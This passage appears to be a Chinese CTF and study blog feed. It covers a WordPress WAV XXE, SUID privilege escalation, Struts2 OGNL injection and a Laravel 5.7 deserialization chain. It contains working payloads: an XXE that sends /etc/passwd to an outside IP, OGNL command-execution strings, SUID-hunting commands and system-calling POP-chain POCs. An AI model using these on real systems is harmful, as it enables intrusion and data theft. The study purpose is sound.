href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a></p><p><a href="https://www.freebuf.com/vuls/272446.html">https://www.freebuf.com/vuls/272446.html</a></p><p><a href="https://dl.packetstormsecurity.net/2106-exploits/CVE-2021-29447.pdf">https://dl.packetstormsecurity.net/2106-exploits/CVE-2021-29447.pdf</a></p><h2 id="PAYLOAD-amp-一些额外知识"><a href="#PAYLOAD-amp-一些额外知识" class="headerlink" title="PAYLOAD&amp;一些额外知识"></a>PAYLOAD&amp;一些额外知识</h2><p>下面使用的都是参数实体</p><p>Now we can create a malicious WAV file.</p><pre class="line-numbers language-none"><code class="language-none">echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;[Our IP]:[PORT]&#x2F;[FILE].dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; 123.wavecho -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wavRIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now create an evil.dtd file to store the next part of the payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file;&#39;&gt;&quot; &gt;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;?p&#x3D;%file;&#39;&gt;&quot; &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总的payload为:</p><p>前面的几个特定字符为构造wave文件的必要结构</p><pre class="line-numbers language-none"><code class="language-none">RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;evil.dtd&#39;&gt;%remote;%init;%trick;]&gt;\x00&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.default&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY %init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file&#39;&quot;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于请求时，将数据base64加密了一遍又压缩了一遍，所以需要先base64解密后解压</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho zlib_decode(base64_decode(&#39;&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><pre class="line-numbers language-none"><code class="language-none">docker-compose up -ddocker-compose downdocker psdocker imagesdocker exec -it (container-id) &#x2F;bin&#x2F;bashdocker rmi (images-id)编辑docker内的文件可以直接 cat&gt;&gt;就行了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="wordpress禁用更新"><a href="#wordpress禁用更新" class="headerlink" title="wordpress禁用更新"></a>wordpress禁用更新</h4><pre class="line-numbers language-none"><code class="language-none">define( &#39;WP_AUTO_UPDATE_CORE&#39;, false ); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下SUID提权</title>
      <link href="/2022/05/01/linux-xia-suid-ti-quan/"/>
      <url>/2022/05/01/linux-xia-suid-ti-quan/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;baijiahao.baidu.com&#x2F;s?id&#x3D;1727594857858909253&amp;wfr&#x3D;spider&amp;for&#x3D;pchttps:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;84872644http:&#x2F;&#x2F;www.hackdig.com&#x2F;05&#x2F;hack-351745.htm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="什么是SUID"><a href="#什么是SUID" class="headerlink" title="什么是SUID"></a>什么是SUID</h3><p>SUID (Set  UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p><p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.  通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限。</p><p>利用此特性,我们可通过SUID进行提权。</p><h3 id="设置SUID"><a href="#设置SUID" class="headerlink" title="设置SUID"></a>设置SUID</h3><p>在了解SUID提权以前 我们简单看一下如何设置SUID权限</p><pre class="line-numbers language-none"><code class="language-none">chmod u+s filename   设置SUID位chmod u-s filename   去掉SUID设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="通过root设置的具有SUID权限的二进制可执行文件提权"><a href="#通过root设置的具有SUID权限的二进制可执行文件提权" class="headerlink" title="通过root设置的具有SUID权限的二进制可执行文件提权"></a>通过root设置的具有SUID权限的二进制可执行文件提权</h3><p>已知的可用来提权的linux可行性的文件列表如下：</p><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li><li>awk</li></ul><p>以下命令可以发现系统上运行的所有SUID可执行文件</p><pre class="line-numbers language-none"><code class="language-none">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2漏洞</title>
      <link href="/2022/04/30/structs2-lou-dong/"/>
      <url>/2022/04/30/structs2-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="struts2漏洞检测工具利用"><a href="#struts2漏洞检测工具利用" class="headerlink" title="struts2漏洞检测工具利用"></a>struts2漏洞检测工具利用</h3><p>这个工具简直现有的洞都通杀，绝绝子！</p><p>脚本通杀 下载 <code>下载链接：https://pan.baidu.com/s/19yr0tWbG1UU_ULjEan5ttQ 提取码：bn71</code></p><p>用法示例：</p><pre class="line-numbers language-none"><code class="language-none">检测python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show&#x2F;S2-001&#x2F;login.action利用python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show&#x2F;S2-001&#x2F;login.action -n S2-001 --exec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="struts的s2-001漏洞"><a href="#struts的s2-001漏洞" class="headerlink" title="struts的s2-001漏洞"></a>struts的s2-001漏洞</h3><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;224041.htmlhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;q20010619&#x2F;article&#x2F;details&#x2F;120729447?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522165130574916782390569415%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id&#x3D;165130574916782390569415&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-120729447.142^v9^pc_search_result_cache,157^v4^control&amp;utm_term&#x3D;ctfshow+web279&amp;spm&#x3D;1018.2226.3001.4187<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式<code>%&#123;value&#125;</code>进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p><code>Struts 2.0.0 - 2.0.8</code></p><h4 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h4><h5 id="三个符号的含义"><a href="#三个符号的含义" class="headerlink" title="% # $三个符号的含义"></a>% # $三个符号的含义</h5><ul><li>%的用途是在标志的属性为字符串时，计算OGNL表达式中<code>%&#123;&#125;</code>中的值</li><li>#的用途主要是访问非根对象属性，因为<code>structs2</code>中的值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才能调用</li><li>$主要是在structs2配置文件中，引用OGNL表达式</li></ul><h5 id="大佬总结的好东西"><a href="#大佬总结的好东西" class="headerlink" title="大佬总结的好东西"></a>大佬总结的好东西</h5><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression  Language，简称为  EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性</p><p> OGNL 三要素：</p><p>1、表达式（Expression）</p><p>表达式是整个 OGNL 的核心，所有的 OGNL  操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL  操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者  department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。</p><p>2、根对象（Root Object）</p><p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user  就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department  中的 name 属性值）。</p><p>3、上下文环境（Context）</p><p>有了表达式和根对象，我们实际上已经可以使用 OGNL  的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是  OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。<br>OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root Object）的存取操作的表达式是不需要增加 #符号进行区分的。</p><h4 id="表达式功能操作清单"><a href="#表达式功能操作清单" class="headerlink" title="表达式功能操作清单"></a>表达式功能操作清单</h4><pre class="line-numbers language-none"><code class="language-none">1. 基本对象树的访问对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问对容器变量的访问，通过#符号加上表达式进行。例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, &#x2F;, ++, --, &#x3D;&#x3D;, !&#x3D;, &#x3D; 等操作符之外，还能使用 mod, in, not in等。4. 容器、数组、对象OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]同时，OGNL支持对Map的按键值查找：例如：#session[&#39;mySessionPropKey&#39;]不仅如此，OGNL还支持容器的构造的表达式：例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map你也可以通过任意类对象的构造函数进行对象新建例如：new Java.net.URL(&quot;xxxxxx&#x2F;&quot;)5. 对静态方法或变量的访问要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：6. 方法调用直接通过类似Java的方法调用方式进行，你甚至可以传递参数：例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择OGNL支持类似数据库中的投影（projection） 和选择（selection）。投影就是选出**中每个元素的相同属性组成新的**，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个**中每个元素的公共属性。例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。选择就是过滤满足selection 条件的**元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：? 选择满足条件的所有元素^ 选择满足条件的第一个元素$ 选择满足条件的最后一个元素例如：group.userList.&#123;? #txxx.xxx !&#x3D; null&#125;将获得某个group中user的name不为空的user的列表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用语句"><a href="#利用语句" class="headerlink" title="利用语句"></a>利用语句</h4><pre class="line-numbers language-none"><code class="language-none">获取Tomcat路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;获取web路径%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;命令执行%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;获取flag，在env中password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="s2-005漏洞"><a href="#s2-005漏洞" class="headerlink" title="s2-005漏洞"></a>s2-005漏洞</h3><h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;193078.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说S2-005是升级版的S2-003。</p><p>先看s2-003</p><pre class="line-numbers language-none"><code class="language-none">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果影响版本：Struts 2.0.0 - Struts 2.0.11.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先我们来看看官方是如何修补的S2-003呢？它是新出了一个沙盒机制，默认禁止了静态方法的调用（<code>allowStaticMethodAcces</code>和<code>MethodAccessor.denyMethodExecution</code>）</p><p>所以我们可以利用OGNL先把沙盒关闭掉，就又可以执行命令了。</p><blockquote><p><code>xwork.MethodAccessor.denyMethodExecution</code>设置为false</p><p><code>allowStaticMethodAccess</code>设置为true</p></blockquote><p>这样就可以关闭掉沙盒机制，unicode编码仍然还是可以的，<code>\u0023</code>会被解析成<code>#</code>，POC还是原来的POC，只不过加上了上面的两个设置。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7反序列化</title>
      <link href="/2022/04/30/laravel5-7-fan-xu-lie-hua/"/>
      <url>/2022/04/30/laravel5-7-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="前期准备-amp-参考资料"><a href="#前期准备-amp-参考资料" class="headerlink" title="前期准备&amp;参考资料"></a>前期准备&amp;参考资料</h3><h4 id="composer相关："><a href="#composer相关：" class="headerlink" title="composer相关："></a>composer相关：</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;blog.unvs.cn&#x2F;archives&#x2F;phpstudy-composer-setup-use.htmlhttps:&#x2F;&#x2F;www.runoob.com&#x2F;w3cnote&#x2F;composer-install-and-usage.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="反序列化参考"><a href="#反序列化参考" class="headerlink" title="反序列化参考"></a>反序列化参考</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;blog.csdn.net&#x2F;rfrder&#x2F;article&#x2F;details&#x2F;113826483https:&#x2F;&#x2F;laworigin.github.io&#x2F;2019&#x2F;02&#x2F;21&#x2F;laravelv5-7反序列化rce&#x2F;https:&#x2F;&#x2F;blog.csdn.net&#x2F;meteox&#x2F;article&#x2F;details&#x2F;121751311<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>github拖源码：<a href="https://github.com/laravel/laravel/tree/5.7">laravel5.7</a></p><p>官方api文档：<a href="https://laravel.com/api/5.8/">https://laravel.com/api/5.8/</a></p><p>记得安装composer！！！（可以使用phpstudy集成的，composer install会遇到报错，需要修改php.ini文件，可以参考上面的链接</p><p>composer install其实还是要下载挺多东西的。</p><h4 id="添加反序列化路由"><a href="#添加反序列化路由" class="headerlink" title="添加反序列化路由"></a>添加反序列化路由</h4><p>注意访问index.php的路径应该为<code>http://127.0.0.1/laravel5.7/public/index.php</code></p><p>注意吧根目录下面的<code>.env.example</code>改为<code>.env</code>（太艹了</p><p>原来还要生成一个key,根目录下执行，根据自己composer install的php版本执行可能比较合适<code>D:\phpstudty8.1\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe artisan key:generate</code>（这个更艹了，<del>我宣布laravel的前期准备真的sb</del></p><p>先在routes&#x2F;web.php添加一条路由解析记录<code>Route::get(&#39;/unser&#39;, &#39;unserialize@unser&#39;);</code></p><p>然后在app&#x2F;Http&#x2F;Controllers下面添加unserialize.php，写上源代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace App\Http\Controllers;class UnserializeController extends Controller&#123;    public function unser()&#123;        if(isset($_GET[&#39;unser&#39;]))&#123;            unserialize($_GET[&#39;unser&#39;]);        &#125;else&#123;            highlight_file(__FILE__);        &#125;        return &quot;unser&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化的payload编写就自行随便建立一个Serialize.php编写即可。</p><h3 id="反序列化链子分析"><a href="#反序列化链子分析" class="headerlink" title="反序列化链子分析"></a>反序列化链子分析</h3><p>对比5.6和5.7版本，可以知道多出了个PendingCommand.php，在这个目录下：<code>D:\phpstudty8.1\phpstudy_pro\WWW\laravel5.7\vendor\laravel\framework\src\Illuminate\Foundation\Testing</code></p><p>查阅官方api文档可知，这个PendingCommand可以进行命令执行，这不是送上来的洞吗，继续翻看可知__destruct方法会调用run方法(现在看到 destruct方法就激动hhh），run方法明显就是来进行<code>commmand execute</code>，所以思路就是构造pop链来触发PendingCommand了。run方法如下：</p><pre class="line-numbers language-none"><code class="language-none">public function run()   &#123;       $this-&gt;hasExecuted &#x3D; true;       $this-&gt;mockConsoleOutput();       try &#123;           $exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);       &#125; catch (NoMatchingExpectationException $e) &#123;           if ($e-&gt;getMethodName() &#x3D;&#x3D;&#x3D; &#39;askQuestion&#39;) &#123;               $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);           &#125;           throw $e;       &#125;       if ($this-&gt;expectedExitCode !&#x3D;&#x3D; null) &#123;           $this-&gt;test-&gt;assertEquals(               $this-&gt;expectedExitCode, $exitCode,               &quot;Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.&quot;           );       &#125;       return $exitCode;   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最主要的利用点在<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>这里，所以要想办法走到这一句话。</p><p>先写一个POC验证一下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现报错了，this-&gt;test没有expectedOutput这个属性<img src="/images/5.7/1.png" class="lazyload placeholder" data-srcset="/images/5.7/1.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>看来得正常执行<code>$this-&gt;mockConsoleOutput();</code>函数才行，下面开始尝试。</p><p>大师傅们经过寻找，选择了<code>Illuminate\Auth\GenericUser</code>类，有一个get方法可以调用：</p><p><img src="/images/5.7/get.png" class="lazyload placeholder" data-srcset="/images/5.7/get.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>调整完后，可以绕过上面那个错误了，POC如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;            $this-&gt;test&#x3D;new GenericUser();        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是遇到了新的错误，<code>Call to a member function bind() on null</code>：</p><p><img src="/images/5.7/bind.png" class="lazyload placeholder" data-srcset="/images/5.7/bind.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>原因大概是this-&gt;app为空，所以写一个进去先：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;calc&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        public function __construct()&#123;        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化后，传入unser，又报错了：</p><p><img src="/images/5.7/kernel.png" class="lazyload placeholder" data-srcset="/images/5.7/kernel.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p><code>Kernel::class</code>是完全限定名称，返回的是一个类的完整的带上命名空间的类名，在laravel这里是<code>Illuminate\Contracts\Console\Kernel</code>。</p><p><code>class Application extends Container implements ApplicationContract, HttpKernelInterface</code>这里可以看出Applocation其实是Container的子类，所以会继承Container的所有函数。</p><p>可以发现进入了Container.php，一路跟踪下去发现最后会返回一个object，object会去调用call函数，搜一下container的call函数，跟踪过程如下：</p><p>先是进入offsetGet：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Get the value at a given offset.     *     * @param  string  $key     * @return mixed     *&#x2F;    public function offsetGet($key)    &#123;        return $this-&gt;make($key);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进入make：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Resolve the given type from the container.     *     * @param  string  $abstract     * @param  array  $parameters     * @return mixed     *&#x2F;    public function make($abstract, array $parameters &#x3D; [])    &#123;        return $this-&gt;resolve($abstract, $parameters);    &#125;<span 